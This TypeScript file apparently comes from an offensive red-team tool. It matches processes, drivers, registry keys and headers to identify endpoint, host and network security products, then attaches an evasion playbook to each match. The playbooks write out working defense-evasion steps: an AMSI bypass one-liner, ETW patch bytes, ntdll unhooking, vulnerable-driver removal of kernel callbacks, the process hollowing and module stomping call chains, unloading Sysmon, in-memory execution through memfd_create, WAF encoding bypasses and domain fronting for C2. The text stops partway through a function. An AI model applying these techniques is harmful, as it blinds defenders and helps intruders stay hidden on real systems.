// server/lib/interception-fingerprint-engine.ts
var VENDOR_DATABASE = [
  // ── CrowdStrike Falcon ──────────────────────────────────────────────
  {
    vendor: "CrowdStrike",
    product: "Falcon",
    domain: "endpoint",
    category: "EDR",
    indicators: [
      { type: "process_name", pattern: /csfalconservice|csfalconcontainer|csagent|falconhost/i, confidence: 0.95, description: "CrowdStrike Falcon sensor process" },
      { type: "service_name", pattern: /csfalconservice|csagent/i, confidence: 0.95, description: "CrowdStrike Falcon Windows service" },
      { type: "driver_name", pattern: /csdevicecontrol|csagent|csboot/i, confidence: 0.95, description: "CrowdStrike kernel driver" },
      { type: "file_path", pattern: /WindowsSensor\.exe|CSFalconService\.exe|CSFalconContainer/i, confidence: 0.9, description: "CrowdStrike sensor binary" },
      { type: "registry_key", pattern: /CrowdStrike|CSFalcon/i, confidence: 0.9, description: "CrowdStrike registry entries" },
      { type: "dll_name", pattern: /csagentinj|csinject/i, confidence: 0.85, description: "CrowdStrike injection DLL" },
      { type: "api_hook", pattern: /csagent.*ntdll/i, confidence: 0.85, description: "CrowdStrike userland API hooks" },
      { type: "kernel_callback", pattern: /csagent|csdevice/i, confidence: 0.9, description: "CrowdStrike kernel callbacks" },
      { type: "minifilter_altitude", pattern: /385200|385201/i, confidence: 0.8, description: "CrowdStrike minifilter altitude" },
      { type: "etw_provider", pattern: /CrowdStrike/i, confidence: 0.85, description: "CrowdStrike ETW provider" }
    ],
    evasionTechniques: [
      {
        id: "cs-ev-01",
        name: "Direct Syscalls (SysWhispers3)",
        difficulty: "moderate",
        opsecRisk: "medium",
        description: "Bypass CrowdStrike userland hooks by invoking NT syscalls directly, skipping hooked ntdll.dll exports",
        implementation: "Use SysWhispers3/HellsGate to resolve syscall numbers dynamically. Avoid static SSN tables (detected by Falcon OverWatch).",
        testedAgainst: ["CrowdStrike Falcon 6.x", "CrowdStrike Falcon 7.x"],
        mitre: { techniqueId: "T1106", techniqueName: "Native API", tactic: "Execution" },
        source: "threat_intel"
      },
      {
        id: "cs-ev-02",
        name: "Unhooking via Fresh NTDLL",
        difficulty: "easy",
        opsecRisk: "medium",
        description: "Map a fresh copy of ntdll.dll from disk/KnownDlls and overwrite the .text section to remove hooks",
        implementation: "MapViewOfFile(\\KnownDlls\\ntdll.dll) \u2192 copy .text section over hooked ntdll. Or read from \\SystemRoot\\System32\\ntdll.dll.",
        testedAgainst: ["CrowdStrike Falcon 6.x"],
        mitre: { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" },
        source: "community"
      },
      {
        id: "cs-ev-03",
        name: "ETW Patching",
        difficulty: "easy",
        opsecRisk: "high",
        description: "Patch EtwEventWrite in ntdll to return immediately, blinding ETW-based telemetry",
        implementation: "Overwrite first bytes of EtwEventWrite with 'xor eax,eax; ret' (C3 33 C0). Note: Falcon kernel sensor still sees syscalls.",
        testedAgainst: ["CrowdStrike Falcon 6.x"],
        mitre: { techniqueId: "T1562.006", techniqueName: "Indicator Blocking", tactic: "Defense Evasion" },
        source: "community"
      },
      {
        id: "cs-ev-04",
        name: "Kernel Callback Removal (Vulnerable Driver)",
        difficulty: "expert",
        opsecRisk: "critical",
        description: "Load a vulnerable signed driver to remove CrowdStrike kernel callbacks from PsSetCreateProcessNotifyRoutine array",
        implementation: "Use BYOVD (e.g., RTCore64.sys, DBUtil_2_3.sys) to write kernel memory. Remove callback entries from PspCreateProcessNotifyRoutine array.",
        testedAgainst: ["CrowdStrike Falcon 6.x (pre-KMCS)"],
        mitre: { techniqueId: "T1014", techniqueName: "Rootkit", tactic: "Defense Evasion" },
        source: "threat_intel"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" },
      { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── SentinelOne ─────────────────────────────────────────────────────
  {
    vendor: "SentinelOne",
    product: "Singularity",
    domain: "endpoint",
    category: "EDR",
    indicators: [
      { type: "process_name", pattern: /sentinelagent|sentinelone|sentinelhelper|sentinelctl|sentinelstaticengine/i, confidence: 0.95, description: "SentinelOne agent process" },
      { type: "service_name", pattern: /SentinelAgent|SentinelOne/i, confidence: 0.95, description: "SentinelOne Windows service" },
      { type: "driver_name", pattern: /sentinel|sentinelmonitor/i, confidence: 0.9, description: "SentinelOne kernel driver" },
      { type: "file_path", pattern: /SentinelAgent\.exe|SentinelOne/i, confidence: 0.9, description: "SentinelOne binary path" },
      { type: "registry_key", pattern: /SentinelOne|Sentinel Labs/i, confidence: 0.85, description: "SentinelOne registry entries" },
      { type: "dll_name", pattern: /InProcessClient64\.dll|SentinelBehavioralAI/i, confidence: 0.85, description: "SentinelOne injection DLL" }
    ],
    evasionTechniques: [
      {
        id: "s1-ev-01",
        name: "Direct Syscalls + Sleep Obfuscation",
        difficulty: "hard",
        opsecRisk: "medium",
        description: "Combine direct syscalls with Ekko/Foliage sleep obfuscation to evade S1 behavioral AI",
        implementation: "Use indirect syscalls (jump to ntdll gadget after syscall setup). Encrypt beacon memory during sleep with ROP-based timer callbacks.",
        testedAgainst: ["SentinelOne 22.x", "SentinelOne 23.x"],
        source: "threat_intel"
      },
      {
        id: "s1-ev-02",
        name: "PPID Spoofing + Token Manipulation",
        difficulty: "moderate",
        opsecRisk: "medium",
        description: "Spoof parent PID to appear as legitimate process tree, manipulate token to evade S1 process lineage tracking",
        implementation: "Use NtCreateUserProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS pointing to explorer.exe or svchost.exe PID.",
        testedAgainst: ["SentinelOne 22.x"],
        mitre: { techniqueId: "T1134.004", techniqueName: "Parent PID Spoofing", tactic: "Defense Evasion" },
        source: "community"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" },
      { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── Microsoft Defender for Endpoint ─────────────────────────────────
  {
    vendor: "Microsoft",
    product: "Defender for Endpoint",
    domain: "endpoint",
    category: "EDR",
    indicators: [
      { type: "process_name", pattern: /MsSense\.exe|MsMpEng\.exe|SenseIR\.exe|SenseCncProxy\.exe|SenseNdr\.exe/i, confidence: 0.95, description: "Microsoft Defender ATP sensor" },
      { type: "service_name", pattern: /Sense|WinDefend|WdNisSvc|WdNisDrv/i, confidence: 0.9, description: "Defender service" },
      { type: "driver_name", pattern: /WdFilter|WdNisDrv|WdBoot/i, confidence: 0.95, description: "Defender kernel drivers" },
      { type: "registry_key", pattern: /Windows Defender|Microsoft\\Windows Defender/i, confidence: 0.85, description: "Defender registry keys" },
      { type: "amsi_provider", pattern: /Windows Defender|MpOav/i, confidence: 0.9, description: "Defender AMSI provider" },
      { type: "etw_provider", pattern: /Microsoft-Windows-Windows Defender|Microsoft-Antimalware-Scan-Interface/i, confidence: 0.9, description: "Defender ETW providers" },
      { type: "minifilter_altitude", pattern: /328010/i, confidence: 0.85, description: "WdFilter minifilter altitude" }
    ],
    evasionTechniques: [
      {
        id: "mde-ev-01",
        name: "AMSI Bypass (AmsiScanBuffer Patch)",
        difficulty: "trivial",
        opsecRisk: "low",
        description: "Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN, bypassing script-based detection",
        implementation: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) \u2014 or patch first bytes of AmsiScanBuffer in amsi.dll",
        testedAgainst: ["Windows Defender", "Defender for Endpoint"],
        mitre: { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" },
        source: "community"
      },
      {
        id: "mde-ev-02",
        name: "Defender Exclusion Abuse",
        difficulty: "easy",
        opsecRisk: "low",
        description: "Drop payloads in Defender exclusion paths (often C:\\Windows\\Temp, user-configured paths)",
        implementation: "Query exclusions: Get-MpPreference | Select ExclusionPath. Drop payload in excluded directory.",
        testedAgainst: ["Windows Defender", "Defender for Endpoint"],
        mitre: { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" },
        source: "vendor_docs"
      },
      {
        id: "mde-ev-03",
        name: "ETW Threat Intelligence Provider Blind",
        difficulty: "hard",
        opsecRisk: "high",
        description: "Patch Microsoft-Windows-Threat-Intelligence ETW provider to blind kernel-level syscall monitoring",
        implementation: "Requires kernel write primitive (BYOVD). Patch EtwTi provider registration in kernel memory.",
        testedAgainst: ["Defender for Endpoint (pre-KMCI)"],
        mitre: { techniqueId: "T1562.006", techniqueName: "Indicator Blocking", tactic: "Defense Evasion" },
        source: "threat_intel"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" },
      { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── Carbon Black (VMware) ──────────────────────────────────────────
  {
    vendor: "VMware",
    product: "Carbon Black",
    domain: "endpoint",
    category: "EDR",
    indicators: [
      { type: "process_name", pattern: /cb\.exe|CbDefense|RepMgr|RepWsc|RepUx|CbOsR/i, confidence: 0.95, description: "Carbon Black sensor process" },
      { type: "service_name", pattern: /CbDefense|CarbonBlack|CbOsR/i, confidence: 0.95, description: "Carbon Black service" },
      { type: "driver_name", pattern: /carbonblack|cbk7|CbOsR/i, confidence: 0.9, description: "Carbon Black kernel driver" },
      { type: "file_path", pattern: /CarbonBlack|Cb Defense/i, confidence: 0.85, description: "Carbon Black installation path" },
      { type: "registry_key", pattern: /CarbonBlack|Bit9/i, confidence: 0.85, description: "Carbon Black registry entries" }
    ],
    evasionTechniques: [
      {
        id: "cb-ev-01",
        name: "Process Hollowing with Legitimate Parent",
        difficulty: "moderate",
        opsecRisk: "medium",
        description: "Hollow a legitimate process (svchost, RuntimeBroker) and inject payload, maintaining clean process tree",
        implementation: "CreateProcess(SUSPENDED) \u2192 NtUnmapViewOfSection \u2192 VirtualAllocEx \u2192 WriteProcessMemory \u2192 SetThreadContext \u2192 ResumeThread",
        testedAgainst: ["Carbon Black Cloud 3.x"],
        mitre: { techniqueId: "T1055.012", techniqueName: "Process Hollowing", tactic: "Defense Evasion" },
        source: "community"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── Sophos Intercept X ─────────────────────────────────────────────
  {
    vendor: "Sophos",
    product: "Intercept X",
    domain: "endpoint",
    category: "EDR",
    indicators: [
      { type: "process_name", pattern: /SophosAgent|SophosClean|SophosHealth|SophosUI|SophosFileScanner|hmpalert|SSPService/i, confidence: 0.95, description: "Sophos agent process" },
      { type: "service_name", pattern: /Sophos|SAVService|SAVAdminService|SophosAgent/i, confidence: 0.95, description: "Sophos service" },
      { type: "driver_name", pattern: /savonaccess|sophosed|hmpalert/i, confidence: 0.9, description: "Sophos kernel driver" },
      { type: "dll_name", pattern: /sophos.*\.dll|hmpalert\.dll/i, confidence: 0.85, description: "Sophos DLL" }
    ],
    evasionTechniques: [
      {
        id: "soph-ev-01",
        name: "Timestomping + Metadata Mimicry",
        difficulty: "easy",
        opsecRisk: "low",
        description: "Match payload timestamps and metadata to legitimate system files to evade Sophos heuristic scanning",
        implementation: "Copy $STANDARD_INFORMATION timestamps from legitimate DLL. Set PE version info to match system binary.",
        testedAgainst: ["Sophos Intercept X 2023"],
        mitre: { techniqueId: "T1070.006", techniqueName: "Timestomp", tactic: "Defense Evasion" },
        source: "community"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── Palo Alto Cortex XDR ───────────────────────────────────────────
  {
    vendor: "Palo Alto",
    product: "Cortex XDR",
    domain: "endpoint",
    category: "EDR",
    indicators: [
      { type: "process_name", pattern: /cyserver|cytool|traps|CortexXDR|XDRAgent/i, confidence: 0.95, description: "Cortex XDR agent process" },
      { type: "service_name", pattern: /CortexXDR|cyserver|cyvera/i, confidence: 0.95, description: "Cortex XDR service" },
      { type: "driver_name", pattern: /tdevice|cyverak|cyvrfsfd/i, confidence: 0.9, description: "Cortex XDR kernel driver" },
      { type: "file_path", pattern: /Cortex XDR|Palo Alto Networks\\Traps/i, confidence: 0.85, description: "Cortex XDR installation path" }
    ],
    evasionTechniques: [
      {
        id: "pa-ev-01",
        name: "Module Stomping (DLL Hollowing)",
        difficulty: "hard",
        opsecRisk: "medium",
        description: "Load a legitimate DLL, overwrite its .text section with shellcode. Cortex XDR trusts signed module loads.",
        implementation: "LoadLibrary(legitimate.dll) \u2192 VirtualProtect(RWX) \u2192 memcpy(shellcode) \u2192 CreateThread. Use a DLL that's not in Cortex's monitored list.",
        testedAgainst: ["Cortex XDR 7.x"],
        mitre: { techniqueId: "T1055.001", techniqueName: "DLL Injection", tactic: "Defense Evasion" },
        source: "threat_intel"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── Elastic EDR (Endpoint Security) ────────────────────────────────
  {
    vendor: "Elastic",
    product: "Endpoint Security",
    domain: "endpoint",
    category: "EDR",
    indicators: [
      { type: "process_name", pattern: /elastic-agent|elastic-endpoint|filebeat|winlogbeat/i, confidence: 0.9, description: "Elastic agent process" },
      { type: "service_name", pattern: /ElasticAgent|ElasticEndpoint/i, confidence: 0.9, description: "Elastic agent service" },
      { type: "file_path", pattern: /Elastic\\Agent|elastic-agent/i, confidence: 0.85, description: "Elastic agent path" }
    ],
    evasionTechniques: [
      {
        id: "el-ev-01",
        name: "Elastic Rule Evasion via Threshold Manipulation",
        difficulty: "moderate",
        opsecRisk: "low",
        description: "Elastic detection rules use thresholds; slow operations below detection thresholds",
        implementation: "Space credential access attempts >5 min apart. Use low-and-slow C2 beaconing (jitter >50%). Avoid triggering ML anomaly detection by mimicking normal process behavior.",
        testedAgainst: ["Elastic 8.x"],
        source: "vendor_docs"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" }
    ],
    operationalImpact: "degrades_stealth"
  },
  // ── Sysmon (Host Monitoring) ───────────────────────────────────────
  {
    vendor: "Microsoft",
    product: "Sysmon",
    domain: "host",
    category: "Host Monitoring",
    indicators: [
      { type: "process_name", pattern: /sysmon\.exe|sysmon64\.exe/i, confidence: 0.95, description: "Sysmon process" },
      { type: "service_name", pattern: /^sysmon$|^sysmon64$/i, confidence: 0.95, description: "Sysmon service" },
      { type: "driver_name", pattern: /sysmondrv/i, confidence: 0.95, description: "Sysmon kernel driver" },
      { type: "registry_key", pattern: /SYSTEM\\CurrentControlSet\\Services\\SysmonDrv/i, confidence: 0.95, description: "Sysmon driver registry" },
      { type: "minifilter_altitude", pattern: /385201/i, confidence: 0.85, description: "Sysmon minifilter altitude" },
      { type: "sysmon_event", pattern: /EventID.*[1-9]|Sysmon.*operational/i, confidence: 0.8, description: "Sysmon event log entries" }
    ],
    evasionTechniques: [
      {
        id: "sm-ev-01",
        name: "Sysmon Config Extraction + Rule Gaps",
        difficulty: "easy",
        opsecRisk: "low",
        description: "Extract Sysmon config to identify unmonitored event IDs and rule exclusions",
        implementation: "fltMC.exe instances \u2192 find SysmonDrv altitude. sysmon -c \u2192 dump config. Analyze <RuleGroup> for exclude patterns. Operate within exclusion gaps.",
        testedAgainst: ["Sysmon 14.x", "Sysmon 15.x"],
        mitre: { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" },
        source: "vendor_docs"
      },
      {
        id: "sm-ev-02",
        name: "Sysmon Driver Unload (Admin)",
        difficulty: "trivial",
        opsecRisk: "high",
        description: "Unload Sysmon driver if running with admin privileges",
        implementation: "fltMC.exe unload SysmonDrv \u2014 or \u2014 sysmon -u (requires admin). Note: This generates a Sysmon Event ID 255 (error) before unload.",
        testedAgainst: ["Sysmon 14.x"],
        mitre: { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" },
        source: "community"
      }
    ],
    mitre: [
      { techniqueId: "T1518.001", techniqueName: "Security Software Discovery", tactic: "Discovery" },
      { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" }
    ],
    operationalImpact: "logs_activity"
  },
  // ── Auditd (Linux Host Monitoring) ─────────────────────────────────
  {
    vendor: "Linux",
    product: "auditd",
    domain: "host",
    category: "Host Monitoring",
    indicators: [
      { type: "process_name", pattern: /auditd|audisp|audispd/i, confidence: 0.95, description: "Linux audit daemon" },
      { type: "service_name", pattern: /auditd/i, confidence: 0.95, description: "auditd service" },
      { type: "file_path", pattern: /\/etc\/audit\/auditd\.conf|\/etc\/audit\/rules\.d/i, confidence: 0.9, description: "auditd config files" },
      { type: "auditd_rule", pattern: /auditctl|ausearch|aureport/i, confidence: 0.8, description: "auditd management commands" }
    ],
    evasionTechniques: [
      {
        id: "aud-ev-01",
        name: "Auditd Rule Gap Analysis",
        difficulty: "easy",
        opsecRisk: "low",
        description: "Enumerate active audit rules to find unmonitored syscalls and paths",
        implementation: "auditctl -l | grep -v '^No rules' \u2014 analyze which syscalls are NOT monitored. Common gaps: mmap, mprotect, memfd_create, ptrace.",
        testedAgainst: ["auditd 3.x"],
        source: "vendor_docs"
      },
      {
        id: "aud-ev-02",
        name: "In-Memory Execution (memfd_create)",
        difficulty: "moderate",
        opsecRisk: "low",
        description: "Execute payloads entirely in memory using memfd_create to avoid file-based audit rules",
        implementation: "fd = memfd_create('', MFD_CLOEXEC); write(fd, elf_payload); fexecve(fd, argv, envp); \u2014 no file touches disk.",
        testedAgainst: ["auditd 3.x", "OSSEC 3.x"],
        mitre: { techniqueId: "T1620", techniqueName: "Reflective Code Loading", tactic: "Defense Evasion" },
        source: "threat_intel"
      }
    ],
    mitre: [
      { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" }
    ],
    operationalImpact: "logs_activity"
  },
  // ── OSSEC/Wazuh (FIM + HIDS) ──────────────────────────────────────
  {
    vendor: "Wazuh",
    product: "Wazuh HIDS",
    domain: "host",
    category: "HIDS/FIM",
    indicators: [
      { type: "process_name", pattern: /ossec|wazuh|wazuh-agentd|wazuh-syscheckd|wazuh-logcollector/i, confidence: 0.95, description: "Wazuh/OSSEC agent process" },
      { type: "service_name", pattern: /wazuh-agent|ossec/i, confidence: 0.9, description: "Wazuh service" },
      { type: "file_path", pattern: /\/var\/ossec|\/var\/wazuh|wazuh-agent/i, confidence: 0.9, description: "Wazuh installation path" },
      { type: "fim_config", pattern: /syscheck|realtime|check_all/i, confidence: 0.8, description: "Wazuh FIM configuration" }
    ],
    evasionTechniques: [
      {
        id: "waz-ev-01",
        name: "FIM Interval Exploitation",
        difficulty: "easy",
        opsecRisk: "low",
        description: "Wazuh syscheck runs on intervals (default 12h). Modify and restore files between checks.",
        implementation: "Check syscheck frequency in /var/ossec/etc/ossec.conf. Modify target file, extract data, restore original within the check interval.",
        testedAgainst: ["Wazuh 4.x"],
        source: "vendor_docs"
      }
    ],
    mitre: [
      { techniqueId: "T1562.001", techniqueName: "Disable or Modify Tools", tactic: "Defense Evasion" }
    ],
    operationalImpact: "logs_activity"
  },
  // ── SSL/TLS Inspection (Network) ───────────────────────────────────
  {
    vendor: "Various",
    product: "SSL/TLS Inspection",
    domain: "network",
    category: "SSL Inspection",
    indicators: [
      { type: "cert_issuer", pattern: /Palo Alto|Fortinet|FortiGate|Zscaler|Blue Coat|Symantec WSS|Barracuda|SonicWall|WatchGuard|Sophos UTM|Check Point|Cisco Umbrella/i, confidence: 0.95, description: "Known SSL inspection CA issuer" },
      { type: "cert_issuer", pattern: /DO_NOT_TRUST|MITM|Proxy|Inspection|Intercept|Corporate|Internal CA/i, confidence: 0.85, description: "Suspicious certificate issuer name" },
      { type: "http_header", pattern: /X-SSL-Inspection|X-Decrypted|X-BlueCoat|X-Zscaler/i, confidence: 0.9, description: "SSL inspection proxy headers" }
    ],
    evasionTechniques: [
      {
        id: "ssl-ev-01",
        name: "Certificate Pinning Bypass Detection",
        difficulty: "easy",
        opsecRisk: "low",
        description: "Detect SSL inspection by comparing certificate chain against expected pinned certificates",
        implementation: "Connect to known endpoint (e.g., google.com). Compare leaf cert issuer against expected Google Trust Services CA. Mismatch = inspection.",
        testedAgainst: ["Palo Alto SSL Decryption", "Zscaler Internet Access", "FortiGate SSL Inspection"],
        source: "vendor_docs"
      },
      {
        id: "ssl-ev-02",
        name: "Domain Fronting / CDN Tunneling",
        difficulty: "moderate",
        opsecRisk: "medium",
        description: "Use domain fronting or CDN-based tunneling to bypass SSL inspection (inspectors see CDN domain, not C2)",
        implementation: "Host C2 on CloudFront/Azure CDN. Set SNI to legitimate CDN domain, Host header to C2 domain. SSL inspector decrypts but sees legitimate CDN traffic.",
        testedAgainst: ["Most SSL inspection products"],
        mitre: { techniqueId: "T1090.004", techniqueName: "Domain Fronting", tactic: "Command and Control" },
        source: "threat_intel"
      }
    ],
    mitre: [
      { techniqueId: "T1557.002", techniqueName: "ARP Cache Poisoning", tactic: "Credential Access" },
      { techniqueId: "T1040", techniqueName: "Network Sniffing", tactic: "Credential Access" }
    ],
    operationalImpact: "monitors_c2"
  },
  // ── WAF (Network) ─────────────────────────────────────────────────
  {
    vendor: "Various",
    product: "Web Application Firewall",
    domain: "network",
    category: "WAF",
    indicators: [
      { type: "http_header", pattern: /cf-ray|cf-cache-status/i, confidence: 0.95, description: "Cloudflare WAF" },
      { type: "http_header", pattern: /x-sucuri-id|x-sucuri-cache/i, confidence: 0.95, description: "Sucuri WAF" },
      { type: "http_header", pattern: /x-amz-cf-id|x-amz-cf-pop/i, confidence: 0.9, description: "AWS CloudFront/WAF" },
      { type: "http_header", pattern: /x-akamai|akamai/i, confidence: 0.9, description: "Akamai WAF" },
      { type: "http_header", pattern: /x-powered-by-plesk|modsecurity/i, confidence: 0.85, description: "ModSecurity WAF" },
      { type: "response_pattern", pattern: /access denied|request blocked|security policy|waf.*block/i, confidence: 0.8, description: "WAF block response" },
      { type: "response_pattern", pattern: /cloudflare.*ray|attention required.*cloudflare/i, confidence: 0.9, description: "Cloudflare challenge page" }
    ],
    evasionTechniques: [
      {
        id: "waf-ev-01",
        name: "WAF Rule Bypass via Encoding",
        difficulty: "moderate",
        opsecRisk: "low",
        description: "Use double URL encoding, Unicode normalization, or chunked transfer encoding to bypass WAF signature rules",
        implementation: "Double encode: %253C \u2192 %3C \u2192 <. Use Unicode: \uFF1Cscript\uFF1E. Chunked TE: split payload across chunks. HPP: param=safe&param=malicious.",
        testedAgainst: ["Cloudflare WAF", "ModSecurity CRS 3.x", "AWS WAF"],
        mitre: { techniqueId: "T1190", techniqueName: "Exploit Public-Facing Application", tactic: "Initial Access" },
        source: "community"
      },
      {
        id: "waf-ev-02",
        name: "Origin IP Discovery",
        difficulty: "moderate",
        opsecRisk: "low",
        description: "Find the origin server IP behind WAF/CDN to bypass WAF entirely",
        implementation: "Check DNS history (SecurityTrails), search Shodan/Censys for matching SSL certs, check SPF/MX records for origin IP, probe common subdomains (mail., ftp., staging.).",
        testedAgainst: ["Cloudflare", "Akamai", "Incapsula"],
        source: "community"
      }
    ],
    mitre: [
      { techniqueId: "T1190", techniqueName: "Exploit Public-Facing Application", tactic: "Initial Access" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── IDS/IPS (Network) ──────────────────────────────────────────────
  {
    vendor: "Various",
    product: "IDS/IPS",
    domain: "network",
    category: "IDS/IPS",
    indicators: [
      { type: "response_pattern", pattern: /snort|suricata|sourcefire/i, confidence: 0.85, description: "IDS/IPS signature in response" },
      { type: "port_behavior", pattern: /tcp_rst_injection|connection_reset/i, confidence: 0.8, description: "TCP RST injection (inline IPS)" },
      { type: "http_header", pattern: /x-ids|x-ips|x-nids/i, confidence: 0.75, description: "IDS/IPS proxy headers" }
    ],
    evasionTechniques: [
      {
        id: "ids-ev-01",
        name: "Protocol-Level Evasion (Fragmentation)",
        difficulty: "moderate",
        opsecRisk: "low",
        description: "Fragment payloads across TCP segments or IP fragments to evade signature-based detection",
        implementation: "Use fragroute/fragrouter for IP fragmentation. TCP segmentation: send payload in 1-byte segments. Overlapping fragments with different reassembly policies.",
        testedAgainst: ["Snort 2.x", "Suricata 6.x"],
        mitre: { techniqueId: "T1001.001", techniqueName: "Junk Data", tactic: "Command and Control" },
        source: "community"
      },
      {
        id: "ids-ev-02",
        name: "Encrypted C2 Channels",
        difficulty: "easy",
        opsecRisk: "low",
        description: "Use encrypted protocols (HTTPS, DNS-over-HTTPS, WireGuard) to prevent signature matching",
        implementation: "Use HTTPS C2 with legitimate certificate. DNS-over-HTTPS for DNS tunneling. WireGuard VPN for all C2 traffic.",
        testedAgainst: ["Snort", "Suricata", "Zeek"],
        mitre: { techniqueId: "T1573", techniqueName: "Encrypted Channel", tactic: "Command and Control" },
        source: "vendor_docs"
      }
    ],
    mitre: [
      { techniqueId: "T1205", techniqueName: "Traffic Signaling", tactic: "Defense Evasion" }
    ],
    operationalImpact: "blocks_exploitation"
  },
  // ── Next-Gen Firewall (Network) ────────────────────────────────────
  {
    vendor: "Various",
    product: "Next-Gen Firewall",
    domain: "network",
    category: "NGFW",
    indicators: [
      { type: "http_header", pattern: /x-pan-|paloalto|fortinet|fortigate|checkpoint/i, confidence: 0.85, description: "NGFW vendor header" },
      { type: "response_pattern", pattern: /application.*blocked|category.*blocked|url.*filtering/i, confidence: 0.8, description: "NGFW URL filtering block" },
      { type: "port_behavior", pattern: /app_id_detection|deep_inspection/i, confidence: 0.75, description: "NGFW application identification" }
    ],
    evasionTechniques: [
      {
        id: "ngfw-ev-01",
        name: "Application Tunneling",
        difficulty: "moderate",
        opsecRisk: "medium",
        description: "Tunnel C2 traffic inside allowed application protocols (HTTPS, WebSocket, gRPC) to bypass app-ID",
        implementation: "Use Cobalt Strike malleable C2 profile mimicking legitimate web traffic. Or tunnel through WebSocket connections to allowed domains.",
        testedAgainst: ["Palo Alto NGFW", "FortiGate", "Check Point"],
        mitre: { techniqueId: "T1071.001", techniqueName: "Web Protocols", tactic: "Command and Control" },
        source: "threat_intel"
      }
    ],
    mitre: [
      { techniqueId: "T1562.004", techniqueName: "Disable or Modify System Firewall", tactic: "Defense Evasion" }
    ],
    operationalImpact: "blocks_exploitation"
  }
];
function fingerprintInterceptions(input) {
  const findings = [];
  const scanId = input.scanId || `ifp-${Date.now()}`;
  const target = input.target || "unknown";
  for (const vendor of VENDOR_DATABASE) {
    const matchedIndicators = [];
    for (const indicator of vendor.indicators) {
      const evidence = matchIndicator(indicator, input);
      if (evidence) {
        matchedIndicators.push({ indicator, evidence });
      }
    }
    if (matchedIndicators.length > 0) {
      const confidence = calculateConfidence(matchedIndicators);
      findings.push({
        id: `${scanId}-${vendor.vendor}-${vendor.product}`.replace(/\s+/g, "-").toLowerCase(),
        domain: vendor.domain,
        category: vendor.category,
        product: vendor.product,
        vendor: vendor.vendor,
        confidence,
        evidence: matchedIndicators.map((m) => m.evidence),
        mitre: vendor.mitre,
        evasionPlaybook: vendor.evasionTechniques,
        detectedOn: target,
        detectedAt: Date.now(),
        summary: `${vendor.vendor} ${vendor.product} detected on ${target} (${confidence.level} confidence: ${(confidence.score * 100).toFixed(0)}%)`,
        operationalImpact: vendor.operationalImpact,
        opsecRecommendations: generateOpsecRecommendations(vendor)
      });
    }
  }
  const summary = buildSummary(findings);
  const evasionStrategy = buildEvasionStrategy(findings);
  return {
    scanId,
    target,
    scanTimestamp: Date.now(),
    findings,
    summary,
    evasionStrategy
  };
}
function matchIndicator(indicator, input) {
  const pattern = indicator.pattern instanceof RegExp ? indicator.pattern : new RegExp(indicator.pattern, "i");
  switch (indicator.type) {
    case "process_name":
      for (const p of input.processes || []) {
        if (pattern.test(p.name) || pattern.test(p.path || "") || pattern.test(p.commandLine || "")) {
          return { type: "process", name: p.name, value: p.path || p.name, raw: p.commandLine };
        }
      }
      break;
    case "service_name":
      for (const s of input.services || []) {
        if (pattern.test(s.name) || pattern.test(s.displayName || "") || pattern.test(s.binaryPath || "")) {
          return { type: "service", name: s.name, value: s.binaryPath || s.name };
        }
      }
      break;
    case "driver_name":
    case "minifilter_altitude":
      for (const d of input.drivers || []) {
        if (pattern.test(d.name) || pattern.test(d.path || "") || pattern.test(d.altitude || "")) {
          return { type: "driver", name: d.name, value: d.path || d.name };
        }
      }
      break;
    case "registry_key":
      for (const r of input.registryKeys || []) {
        if (pattern.test(r.path) || pattern.test(r.valueName || "") || pattern.test(r.valueData || "")) {
          return { type: "registry", name: r.path, value: r.valueData || r.valueName || "" };
        }
      }
      break;
    case "file_path":
      for (const f of input.files || []) {
        if (pattern.test(f.path) || pattern.test(f.name || "")) {
          return { type: "file", name: f.name || f.path, value: f.path };
        }
      }
      break;
    case "dll_name":
      for (const d of input.dlls || []) {
        if (pattern.test(d.name) || pattern.test(d.path || "")) {
          return { type: "api_hook", name: d.name, value: d.path || d.name, raw: d.loadedIn ? `Loaded in: ${d.loadedIn}` : void 0 };
        }
      }
      break;
    case "api_hook":
      for (const d of input.dlls || []) {
        if (pattern.test(d.name) || pattern.test(d.path || "")) {
          return { type: "api_hook", name: d.name, value: d.path || d.name };
        }
      }
      break;
    case "etw_provider":
    case "amsi_provider":
    case "kernel_callback":
    case "sysmon_event":
    case "auditd_rule":
    case "fim_config":
    case "firewall_rule":
      for (const cmd of input.commandOutputs || []) {
        if (pattern.test(cmd.output)) {
